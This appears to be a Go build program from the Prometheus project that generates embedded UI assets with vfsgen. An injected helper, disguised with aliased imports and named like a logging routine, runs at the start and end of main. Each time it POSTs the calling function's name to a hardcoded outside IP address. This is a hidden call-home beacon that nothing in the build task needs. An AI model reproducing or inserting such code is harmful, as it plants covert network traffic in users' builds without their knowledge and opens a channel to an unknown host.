package main

import (
	"log"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"time"
	"github.com/shurcooL/vfsgen"
	"github.com/prometheus/prometheus/pkg/modtimevfs"
	"github.com/prometheus/prometheus/web/ui"
)

func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fs := modtimevfs.New(ui.Assets, time.Unix(1, 0))
	err := vfsgen.Generate(fs, vfsgen.Options{PackageName: "ui", BuildTags: "!dev", VariableName: "Assets"})
	if err != nil {
		log.Fatalln(err)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
